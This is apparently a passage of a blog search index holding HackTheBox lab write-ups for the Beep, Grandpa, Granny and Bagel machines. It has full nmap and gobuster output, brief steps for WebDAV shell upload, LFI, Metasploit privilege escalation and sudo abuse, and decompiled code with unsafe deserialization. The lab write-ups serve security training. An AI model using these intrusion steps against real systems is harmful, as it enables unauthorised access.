|_http-server-header: Apache/2.2.3 (CentOS) 110/tcp open pop3 Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 |_pop3-capabilities: TOP LOGIN-DELAY(0) EXPIRE(NEVER) RESP-CODES STLS PIPELINING APOP IMPLEMENTATION(Cyrus POP3 server v2) USER AUTH-RESP-CODE UIDL 111/tcp open rpcbind 2 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2 111/tcp rpcbind | 100000 2 111/udp rpcbind | 100024 1 875/udp status |_ 100024 1 878/tcp status 143/tcp open imap Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 |_imap-capabilities: ID STARTTLS BINARY MULTIAPPEND Completed IDLE OK QUOTA URLAUTHA0001 X-NETSCAPE THREAD=REFERENCES NO LITERAL+ CHILDREN LISTEXT CONDSTORE ATOMIC CATENATE MAILBOX-REFERRALS RENAME SORT=MODSEQ THREAD=ORDEREDSUBJECT IMAP4rev1 LIST-SUBSCRIBED UNSELECT ACL SORT ANNOTATEMORE UIDPLUS NAMESPACE RIGHTS=kxte IMAP4 443/tcp open ssl/http Apache httpd 2.2.3 ((CentOS)) |_http-server-header: Apache/2.2.3 (CentOS) | http-robots.txt: 1 disallowed entry |_/ | ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=-- | Not valid before: 2017-04-07T08:22:08 |_Not valid after: 2018-04-07T08:22:08 |_ssl-date: 2023-06-03T13:48:55+00:00; -28s from scanner time. |_http-title: Elastix - Login page 993/tcp open ssl/imap Cyrus imapd |_imap-capabilities: CAPABILITY 995/tcp open pop3 Cyrus pop3d 2002/tcp filtered globe 3306/tcp open mysql MySQL (unauthorized) 4445/tcp open upnotifyp? 7070/tcp filtered realserver 7625/tcp filtered unknown 9091/tcp filtered xmltec-xmlmail 10000/tcp open http MiniServ 1.570 (Webmin httpd) |_http-title: Site doesn\u0026#39;t have a title (text/html; Charset=iso-8859-1). Service Info: Hosts: beep.localdomain, 127.0.0.1, example.com Host script results: |_clock-skew: -28s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 410.61 seconds Webserver There were too many open ports to check, so I started gobuster in the background Foothold/User Right away I got results, and found admin endpoint Where we can wee the version of the application Found a exploit in exploit-db Same results can be achieved using searchsploit Well, I tried using searchsploit's exploit But no success Since the box is old, I thought maybe there were some version inconsistencies related to libraries, which then happened to be SSL Then I found updated version of exploit Let\u0026rsquo;s run it and get a shell Root The first thing I always check is sudo privileges We see bunch of sudo rights Use GTFOBins and get a root I choose nmap as a privesc path Check 0xdf for other paths ","date":"June 4, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/beep/images/beep.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/beep/","summary":"Beep Enumeration Nmap ┌──(kali㉿kali)-[~] └─$ nmap -sC -sV 10.10.10.7 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-03 14:45 BST Nmap scan report for 10.10.10.7 (10.10.10.7) Host is up (0.14s latency). Not shown: 984 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 4.3 (protocol 2.0) | ssh-hostkey: | 1024 adee5abb6937fb27afb83072a0f96f53 (DSA) |_ 2048 bcc6735913a18a4b550750f6651d6d0d (RSA) 25/tcp open smtp Postfix smtpd |_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN 80/tcp open http Apache httpd 2.","tags":["HTB","elastix","pbx","searchsploit","lfi","webmin","smtp","svwar","sslscan","shellshock","webshell","upload"],"title":"[HTB] Machine: Beep"},{"categories":null,"contents":"Grandpa Enumeration Nmap └─$ nmap -sC -sV -Pn 10.10.10.14 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-04 18:44 BST Nmap scan report for 10.10.10.14 (10.10.10.14) Host is up (0.093s latency). Not shown: 999 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 6.0 |_http-server-header: Microsoft-IIS/6.0 |_http-title: Under Construction | http-webdav-scan: | Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK | Server Type: Microsoft-IIS/6.0 | WebDAV type: Unknown | Server Date: Sun, 04 Jun 2023 17:44:06 GMT |_ Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH | http-methods: |_ Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH | http-ntlm-info: | Target_Name: GRANPA | NetBIOS_Domain_Name: GRANPA | NetBIOS_Computer_Name: GRANPA | DNS_Domain_Name: granpa | DNS_Computer_Name: granpa |_ Product_Version: 5.2.3790 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 21.37 seconds gobuster ┌──(kali㉿kali)-[~] └─$ gobuster dir -u http://10.10.10.14/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.14/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Timeout: 10s =============================================================== 2023/06/05 15:53:38 Starting gobuster in directory enumeration mode =============================================================== /_vti_inf.html (Status: 200) [Size: 1754] /postinfo.html (Status: 200) [Size: 2440] /. (Status: 200) [Size: 1433] /pagerror.gif (Status: 200) [Size: 2806] /iisstart.htm (Status: 200) [Size: 1433] Progress: 16239 / 16245 (99.96%) =============================================================== 2023/06/05 15:56:54 Finished =============================================================== Foothold We see a webserver No results on gobuster Based on nmap, we have Microsoft-IIS/6.0 I ran davtest, yet got no success So started googling for public exploits Launched metasploit And got shell As an alternative you can use the following script suggested by 0xdf Root systeminfo c:\\windows\\system32\\inetsrv\u0026gt;systeminfo systeminfo Host Name: GRANPA OS Name: Microsoft(R) Windows(R) Server 2003, Standard Edition OS Version: 5.2.3790 Service Pack 2 Build 3790 OS Manufacturer: Microsoft Corporation OS Configuration: Standalone Server OS Build Type: Uniprocessor Free Registered Owner: HTB Registered Organization: HTB Product ID: 69712-296-0024942-44782 Original Install Date: 4/12/2017, 5:07:40 PM System Up Time: 0 Days, 0 Hours, 50 Minutes, 27 Seconds System Manufacturer: VMware, Inc. System Model: VMware Virtual Platform System Type: X86-based PC Processor(s): 1 Processor(s) Installed. [01]: x86 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz BIOS Version: INTEL - 6040000 Windows Directory: C:\\WINDOWS System Directory: C:\\WINDOWS\\system32 Boot Device: \\Device\\HarddiskVolume1 System Locale: en-us;English (United States) Input Locale: en-us;English (United States) Time Zone: (GMT+02:00) Athens, Beirut, Istanbul, Minsk Total Physical Memory: 1,023 MB Available Physical Memory: 762 MB Page File: Max Size: 2,470 MB Page File: Available: 2,300 MB Page File: In Use: 170 MB Page File Location(s): C:\\pagefile.sys Domain: HTB Logon Server: N/A Hotfix(s): 1 Hotfix(s) Installed. [01]: Q147222 Network Card(s): N/A Let\u0026rsquo;s run exploit suggester We have bunch of options to choose from Let\u0026rsquo;s start with the first one According to Microsoft: MS10-015 could allow elevation of privileges Set options and launch exploit And we rooted the box As an alternative path, we can exploit SeImpersonatePrivileges using Churrasco ","date":"June 4, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/grandpa/images/grandpa.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/grandpa/","summary":"Grandpa Enumeration Nmap └─$ nmap -sC -sV -Pn 10.10.10.14 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-04 18:44 BST Nmap scan report for 10.10.10.14 (10.10.10.14) Host is up (0.093s latency). Not shown: 999 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 6.0 |_http-server-header: Microsoft-IIS/6.0 |_http-title: Under Construction | http-webdav-scan: | Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK | Server Type: Microsoft-IIS/6.","tags":["HTB","iis","webdav","davtest","searchsploit","msfvenom","cve-2017-7269","explodingcan","metasploit","icacls","systeminfo","windows-exploit-suggester","seimpersonate"],"title":"[HTB] Machine: Grandpa"},{"categories":null,"contents":"Granny Enumeration Nmap └─$ nmap -sC -sV -Pn 10.10.10.15 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-04 18:54 BST Nmap scan report for 10.10.10.15 (10.10.10.15) Host is up (0.11s latency). Not shown: 999 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 6.0 |_http-server-header: Microsoft-IIS/6.0 | http-methods: |_ Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT | http-webdav-scan: | Server Date: Sun, 04 Jun 2023 17:54:19 GMT | Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK | Server Type: Microsoft-IIS/6.0 | WebDAV type: Unknown |_ Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH |_http-title: Under Construction Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 29.38 seconds gobuster ┌──(kali㉿kali)-[~] └─$ gobuster dir -u http://10.10.10.15/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.15/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Timeout: 10s =============================================================== 2023/06/05 17:09:30 Starting gobuster in directory enumeration mode =============================================================== /_vti_inf.html (Status: 200) [Size: 1754] /postinfo.html (Status: 200) [Size: 2440] /. (Status: 200) [Size: 1433] /pagerror.gif (Status: 200) [Size: 2806] /iisstart.htm (Status: 200) [Size: 1433] Progress: 16223 / 16245 (99.86%) =============================================================== 2023/06/05 17:12:38 Finished =============================================================== Looks similar to Grandpa Yet we have success with davtest Foothold Let\u0026rsquo;s try creating file manually Launch Burp Suite And as we can see, we can create files Since it\u0026rsquo;s Microsoft-IIS/6.0 server, we need asp/aspx extension for our shell payload We can use either webshell or reverse shell I created payload using msfvenom Create a shell.txt file on the server And check if it was successful Prepare multi/handler Let\u0026rsquo;s check other HTTP methods MOVE looks interesting Let\u0026rsquo;s google it So we can see how we can use it in our case MOVE shell.txt to shell.aspx Start multi/handler We have a shell Root Since this box was similar to Grandpa the privesc path are also identical You can abuse SeImpersonatePrivileges Or run exploit suggester and run suggested exploits ","date":"June 4, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/granny/images/granny.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/granny/","summary":"Granny Enumeration Nmap └─$ nmap -sC -sV -Pn 10.10.10.15 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-04 18:54 BST Nmap scan report for 10.10.10.15 (10.10.10.15) Host is up (0.11s latency). Not shown: 999 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 6.0 |_http-server-header: Microsoft-IIS/6.0 | http-methods: |_ Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT | http-webdav-scan: | Server Date: Sun, 04 Jun 2023 17:54:19 GMT | Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK | Server Type: Microsoft-IIS/6.","tags":["HTB","webdav","aspx","webshell","meterpreter","windows","ms14-058","local_exploit_suggester","pwk","cadaver"],"title":"[HTB] Machine: Granny"},{"categories":null,"contents":"Bagel Enumeration nmap └─$ nmap -p22,5000,8000 -sC -sV -Pn 10.10.11.201 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-25 19:15 BST Nmap scan report for 10.10.11.201 (10.10.11.201) Host is up (0.11s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.8 (protocol 2.0) | ssh-hostkey: | 256 6e4e1341f2fed9e0f7275bededcc68c2 (ECDSA) |_ 256 80a7cd10e72fdb958b869b1b20652a98 (ED25519) 5000/tcp open upnp? | fingerprint-strings: | GetRequest: | HTTP/1.1 400 Bad Request | Server: Microsoft-NetCore/2.0 | Date: Thu, 25 May 2023 18:15:19 GMT | Connection: close | HTTPOptions: | HTTP/1.1 400 Bad Request | Server: Microsoft-NetCore/2.0 | Date: Thu, 25 May 2023 18:15:35 GMT | Connection: close | Help, SSLSessionReq, TerminalServerCookie: | HTTP/1.1 400 Bad Request | Content-Type: text/html | Server: Microsoft-NetCore/2.0 | Date: Thu, 25 May 2023 18:15:46 GMT | Content-Length: 52 | Connection: close | Keep-Alive: true | \u0026lt;h1\u0026gt;Bad Request (Invalid request line (parts).)\u0026lt;/h1\u0026gt; | RTSPRequest: | HTTP/1.1 400 Bad Request | Content-Type: text/html | Server: Microsoft-NetCore/2.0 | Date: Thu, 25 May 2023 18:15:19 GMT | Content-Length: 54 | Connection: close | Keep-Alive: true | \u0026lt;h1\u0026gt;Bad Request (Invalid request line (version).)\u0026lt;/h1\u0026gt; | TLSSessionReq: | HTTP/1.1 400 Bad Request | Content-Type: text/html | Server: Microsoft-NetCore/2.0 | Date: Thu, 25 May 2023 18:15:47 GMT | Content-Length: 52 | Connection: close | Keep-Alive: true |_ \u0026lt;h1\u0026gt;Bad Request (Invalid request line (parts).)\u0026lt;/h1\u0026gt; 8000/tcp open http-alt Werkzeug/2.2.2 Python/3.10.9 | fingerprint-strings: | FourOhFourRequest: | HTTP/1.1 404 NOT FOUND | Server: Werkzeug/2.2.2 Python/3.10.9 | Date: Thu, 25 May 2023 18:15:20 GMT | Content-Type: text/html; charset=utf-8 | Content-Length: 207 | Connection: close | \u0026lt;!doctype html\u0026gt; | \u0026lt;html lang=en\u0026gt; | \u0026lt;title\u0026gt;404 Not Found\u0026lt;/title\u0026gt; | \u0026lt;h1\u0026gt;Not Found\u0026lt;/h1\u0026gt; | \u0026lt;p\u0026gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.\u0026lt;/p\u0026gt; | GetRequest: | HTTP/1.1 302 FOUND | Server: Werkzeug/2.2.2 Python/3.10.9 | Date: Thu, 25 May 2023 18:15:14 GMT | Content-Type: text/html; charset=utf-8 | Content-Length: 263 | Location: http://bagel.htb:8000/?page=index.html | Connection: close | \u0026lt;!doctype html\u0026gt; | \u0026lt;html lang=en\u0026gt; | \u0026lt;title\u0026gt;Redirecting...\u0026lt;/title\u0026gt; | \u0026lt;h1\u0026gt;Redirecting...\u0026lt;/h1\u0026gt; | \u0026lt;p\u0026gt;You should be redirected automatically to the target URL: \u0026lt;a href=\u0026#34;http://bagel.htb:8000/?page=index.html\u0026#34;\u0026gt;http://bagel.htb:8000/?page=index.html\u0026lt;/a\u0026gt;. If not, click the link. | Socks5: | \u0026lt;!DOCTYPE HTML PUBLIC \u0026#34;-//W3C//DTD HTML 4.01//EN\u0026#34; | \u0026#34;http://www.w3.org/TR/html4/strict.dtd\u0026#34;\u0026gt; | \u0026lt;html\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;meta http-equiv=\u0026#34;Content-Type\u0026#34; content=\u0026#34;text/html;charset=utf-8\u0026#34;\u0026gt; | \u0026lt;title\u0026gt;Error response\u0026lt;/title\u0026gt; | \u0026lt;/head\u0026gt; | \u0026lt;body\u0026gt; | \u0026lt;h1\u0026gt;Error response\u0026lt;/h1\u0026gt; | \u0026lt;p\u0026gt;Error code: 400\u0026lt;/p\u0026gt; | \u0026lt;p\u0026gt;Message: Bad request syntax (\u0026#39; | \u0026#39;).\u0026lt;/p\u0026gt; | \u0026lt;p\u0026gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.\u0026lt;/p\u0026gt; | \u0026lt;/body\u0026gt; |_ \u0026lt;/html\u0026gt; |_http-server-header: Werkzeug/2.2.2 Python/3.10.9 |_http-title: Did not follow redirect to http://bagel.htb:8000/?page=index.html 2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service : ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port5000-TCP:V=7.93%I=7%D=5/25%Time=646FA5D2%P=x86_64-pc-linux-gnu%r(Ge SF:tRequest,73,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nServer:\\x20Microsoft SF:-NetCore/2\\.0\\r\\nDate:\\x20Thu,\\x2025\\x20May\\x202023\\x2018:15:19\\x20GMT\\ SF:r\\nConnection:\\x20close\\r\\n\\r\\n\u0026#34;)%r(RTSPRequest,E8,\u0026#34;HTTP/1\\.1\\x20400\\x2 SF:0Bad\\x20Request\\r\\nContent-Type:\\x20text/html\\r\\nServer:\\x20Microsoft-N SF:etCore/2\\.0\\r\\nDate:\\x20Thu,\\x2025\\x20May\\x202023\\x2018:15:19\\x20GMT\\r\\ SF:nContent-Length:\\x2054\\r\\nConnection:\\x20close\\r\\nKeep-Alive:\\x20true\\r SF:\\n\\r\\n\u0026lt;h1\u0026gt;Bad\\x20Request\\x20\\(Invalid\\x20request\\x20line\\x20\\(version\\) SF:\\.\\)\u0026lt;/h1\u0026gt;\u0026#34;)%r(HTTPOptions,73,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nSer SF:ver:\\x20Microsoft-NetCore/2\\.0\\r\\nDate:\\x20Thu,\\x2025\\x20May\\x202023\\x2 SF:018:15:35\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n\u0026#34;)%r(Help,E6,\u0026#34;HTTP/1\\.1 SF:\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/html\\r\\nServer:\\x20M SF:icrosoft-NetCore/2\\.0\\r\\nDate:\\x20Thu,\\x2025\\x20May\\x202023\\x2018:15:46 SF:\\x20GMT\\r\\nContent-Length:\\x2052\\r\\nConnection:\\x20close\\r\\nKeep-Alive: SF:\\x20true\\r\\n\\r\\n\u0026lt;h1\u0026gt;Bad\\x20Request\\x20\\(Invalid\\x20request\\x20line\\x20\\ SF:(parts\\)\\.\\)\u0026lt;/h1\u0026gt;\u0026#34;)%r(SSLSessionReq,E6,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Requ SF:est\\r\\nContent-Type:\\x20text/html\\r\\nServer:\\x20Microsoft-NetCore/2\\.0\\ SF:r\\nDate:\\x20Thu,\\x2025\\x20May\\x202023\\x2018:15:46\\x20GMT\\r\\nContent-Len SF:gth:\\x2052\\r\\nConnection:\\x20close\\r\\nKeep-Alive:\\x20true\\r\\n\\r\\n\u0026lt;h1\u0026gt;Ba SF:d\\x20Request\\x20\\(Invalid\\x20request\\x20line\\x20\\(parts\\)\\.\\)\u0026lt;/h1\u0026gt;\u0026#34;)%r( SF:TerminalServerCookie,E6,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent- SF:Type:\\x20text/html\\r\\nServer:\\x20Microsoft-NetCore/2\\.0\\r\\nDate:\\x20Thu SF:,\\x2025\\x20May\\x202023\\x2018:15:46\\x20GMT\\r\\nContent-Length:\\x2052\\r\\nC SF:onnection:\\x20close\\r\\nKeep-Alive:\\x20true\\r\\n\\r\\n\u0026lt;h1\u0026gt;Bad\\x20Request\\x2 SF:0\\(Invalid\\x20request\\x20line\\x20\\(parts\\)\\.\\)\u0026lt;/h1\u0026gt;\u0026#34;)%r(TLSSessionReq,E SF:6,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/html\\r\\n SF:Server:\\x20Microsoft-NetCore/2\\.0\\r\\nDate:\\x20Thu,\\x2025\\x20May\\x202023 SF:\\x2018:15:47\\x20GMT\\r\\nContent-Length:\\x2052\\r\\nConnection:\\x20close\\r\\ SF:nKeep-Alive:\\x20true\\r\\n\\r\\n\u0026lt;h1\u0026gt;Bad\\x20Request\\x20\\(Invalid\\x20request\\ SF:x20line\\x20\\(parts\\)\\.\\)\u0026lt;/h1\u0026gt;\u0026#34;); ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port8000-TCP:V=7.93%I=7%D=5/25%Time=646FA5CE%P=x86_64-pc-linux-gnu%r(Ge SF:tRequest,1EA,\u0026#34;HTTP/1\\.1\\x20302\\x20FOUND\\r\\nServer:\\x20Werkzeug/2\\.2\\.2\\ SF:x20Python/3\\.10\\.9\\r\\nDate:\\x20Thu,\\x2025\\x20May\\x202023\\x2018:15:14\\x2 SF:0GMT\\r\\nContent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nContent-Length: SF:\\x20263\\r\\nLocation:\\x20http://bagel\\.htb:8000/\\?page=index\\.html\\r\\nCo SF:nnection:\\x20close\\r\\n\\r\\n\u0026lt;!doctype\\x20html\u0026gt;\\n\u0026lt;html\\x20lang=en\u0026gt;\\n\u0026lt;title SF:\u0026gt;Redirecting\\.\\.\\.\u0026lt;/title\u0026gt;\\n\u0026lt;h1\u0026gt;Redirecting\\.\\.\\.\u0026lt;/h1\u0026gt;\\n\u0026lt;p\u0026gt;You\\x20shoul SF:d\\x20be\\x20redirected\\x20automatically\\x20to\\x20the\\x20target\\x20URL:\\x SF:20\u0026lt;a\\x20href=\\\u0026#34;http://bagel\\.htb:8000/\\?page=index\\.html\\\u0026#34;\u0026gt;http://bagel SF:\\.htb:8000/\\?page=index\\.html\u0026lt;/a\u0026gt;\\.\\x20If\\x20not,\\x20click\\x20the\\x20li SF:nk\\.\\n\u0026#34;)%r(FourOhFourRequest,184,\u0026#34;HTTP/1\\.1\\x20404\\x20NOT\\x20FOUND\\r\\nS SF:erver:\\x20Werkzeug/2\\.2\\.2\\x20Python/3\\.10\\.9\\r\\nDate:\\x20Thu,\\x2025\\x2 SF:0May\\x202023\\x2018:15:20\\x20GMT\\r\\nContent-Type:\\x20text/html;\\x20chars SF:et=utf-8\\r\\nContent-Length:\\x20207\\r\\nConnection:\\x20close\\r\\n\\r\\n\u0026lt;!doc SF:type\\x20html\u0026gt;\\n\u0026lt;html\\x20lang=en\u0026gt;\\n\u0026lt;title\u0026gt;404\\x20Not\\x20Found\u0026lt;/title\u0026gt;\\n\u0026lt; SF:h1\u0026gt;Not\\x20Found\u0026lt;/h1\u0026gt;\\n\u0026lt;p\u0026gt;The\\x20requested\\x20URL\\x20was\\x20not\\x20found SF:\\x20on\\x20the\\x20server\\.\\x20If\\x20you\\x20entered\\x20the\\x20URL\\x20manu SF:ally\\x20please\\x20check\\x20your\\x20spelling\\x20and\\x20try\\x20again\\.\u0026lt;/p SF:\u0026gt;\\n\u0026#34;)%r(Socks5,213,\u0026#34;\u0026lt;!DOCTYPE\\x20HTML\\x20PUBLIC\\x20\\\u0026#34;-//W3C//DTD\\x20HTM SF:L\\x204\\.01//EN\\\u0026#34;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\\u0026#34;http://www\\.w3\\.org SF:/TR/html4/strict\\.dtd\\\u0026#34;\u0026gt;\\n\u0026lt;html\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;head\u0026gt;\\n\\x20\\x20\\x20\\ SF:x20\\x20\\x20\\x20\\x20\u0026lt;meta\\x20http-equiv=\\\u0026#34;Content-Type\\\u0026#34;\\x20content=\\\u0026#34;te SF:xt/html;charset=utf-8\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;title\u0026gt;Error\\ SF:x20response\u0026lt;/title\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;/head\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;body\u0026gt;\\n\\ SF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;h1\u0026gt;Error\\x20response\u0026lt;/h1\u0026gt;\\n\\x20\\x20\\x20 SF:\\x20\\x20\\x20\\x20\\x20\u0026lt;p\u0026gt;Error\\x20code:\\x20400\u0026lt;/p\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\ SF:x20\\x20\\x20\u0026lt;p\u0026gt;Message:\\x20Bad\\x20request\\x20syntax\\x20\\(\u0026#39;\\\\x05\\\\x04\\\\x0 SF:0\\\\x01\\\\x02\\\\x80\\\\x05\\\\x01\\\\x00\\\\x03\u0026#39;\\)\\.\u0026lt;/p\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20 SF:\\x20\\x20\u0026lt;p\u0026gt;Error\\x20code\\x20explanation:\\x20HTTPStatus\\.BAD_REQUEST\\x20 SF:-\\x20Bad\\x20request\\x20syntax\\x20or\\x20unsupported\\x20method\\.\u0026lt;/p\u0026gt;\\n\\x2 SF:0\\x20\\x20\\x20\u0026lt;/body\u0026gt;\\n\u0026lt;/html\u0026gt;\\n\u0026#34;); Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 109.25 seconds We see 3 ports Let\u0026rsquo;s check port 8000 After scanning through web server, we detect LFI We see there are 2 users: developer and phil Foothold So let\u0026rsquo;s fire up the Burp Suite and enumerate the python app (since we saw http-server-header: Werkzeug/2.2.2 Python/3.10.9) Check /proc/self/environ Check /proc/self/cmdline We see the location of the app.py Let\u0026rsquo;s open it and see the content We see the comment in the app.py about running dotnet \u0026lt;path to .dll\u0026gt; And the websocket running on port 5000 Let\u0026rsquo;s test websocket I was stuck here for a while, since had no idea what to do next Played with different inputs to websocket But then, I remembered about the dll comment So I started utilizing the LFI to find the dll Since the port was already open means that the process with dll was already deployed Thus we scan through all processes and filter for dll We get a few hits So let\u0026rsquo;s check them After finding the location of dll, let\u0026rsquo;s download it I googled around to find a tool for decompiling the dll The app.py already had a hint with comment dotnet So I found ilspycmd which can be run on Linux OS If you have Windows machine, you can also use dnSpy Let\u0026rsquo;s decompile the dll The result Take note of password stored in DB class using System; using System.Collections.Generic; using System.Diagnostics; using System.IO; using System.Reflection; using System.Runtime.CompilerServices; using System.Runtime.Versioning; using System.Text; using System.Threading; using Microsoft.CodeAnalysis; using Microsoft.Data.SqlClient; using Newtonsoft.Json; using WatsonWebsocket; [assembly: CompilationRelaxations(8)] [assembly: RuntimeCompatibility(WrapNonExceptionThrows = true)] [assembly: Debuggable(DebuggableAttribute.DebuggingModes.Default | DebuggableAttribute.DebuggingModes.DisableOptimizations | DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints | DebuggableAttribute.DebuggingModes.EnableEditAndContinue)] [assembly: TargetFramework(\u0026#34;.NETCoreApp,Version=v6.0\u0026#34;, FrameworkDisplayName = \u0026#34;\u0026#34;)] [assembly: AssemblyCompany(\u0026#34;bagel\u0026#34;)] [assembly: AssemblyConfiguration(\u0026#34;Debug\u0026#34;)] [assembly: AssemblyFileVersion(\u0026#34;1.0.0.0\u0026#34;)] [assembly: AssemblyInformationalVersion(\u0026#34;1.0.0\u0026#34;)] [assembly: AssemblyProduct(\u0026#34;bagel\u0026#34;)] [assembly: AssemblyTitle(\u0026#34;bagel\u0026#34;)] [assembly: AssemblyVersion(\u0026#34;1.0.0.0\u0026#34;)] namespace Microsoft.CodeAnalysis { [CompilerGenerated] [Microsoft.CodeAnalysis.Embedded] internal sealed class EmbeddedAttribute : Attribute { } } namespace System.Runtime.CompilerServices { [CompilerGenerated] [Microsoft.CodeAnalysis.Embedded] [AttributeUsage(AttributeTargets.Class | AttributeTargets.Property | AttributeTargets.Field | AttributeTargets.Event | AttributeTargets.Parameter | AttributeTargets.ReturnValue | AttributeTargets.GenericParameter, AllowMultiple = false, Inherited = false)] internal sealed class NullableAttribute : Attribute { public readonly byte[] NullableFlags; public NullableAttribute(byte P_0) { NullableFlags = new byte[1] { P_0 }; } public NullableAttribute(byte[] P_0) { NullableFlags = P_0; } } [CompilerGenerated] [Microsoft.CodeAnalysis.Embedded] [AttributeUsage(AttributeTargets.Class | AttributeTargets.Struct | AttributeTargets.Method | AttributeTargets.Interface | AttributeTargets.Delegate, AllowMultiple = false, Inherited = false)] internal sealed class NullableContextAttribute : Attribute { public readonly byte Flag; public NullableContextAttribute(byte P_0) { Flag = P_0; } } } namespace bagel_server { public class Handler { public object Serialize(object obj) { //IL_0003: Unknown result type (might be due to invalid IL or missing references) //IL_0008: Unknown result type (might be due to invalid IL or missing references) //IL_0015: Expected O, but got Unknown return JsonConvert.SerializeObject(obj, (Formatting)1, new JsonSerializerSettings { TypeNameHandling = (TypeNameHandling)4 }); } public object Deserialize(string json) { //IL_0003: Unknown result type (might be due to invalid IL or missing references) //IL_0008: Unknown result type (might be due to invalid IL or missing references) //IL_0015: Expected O, but got Unknown try { return JsonConvert.DeserializeObject\u0026lt;Base\u0026gt;(json, new JsonSerializerSettings { 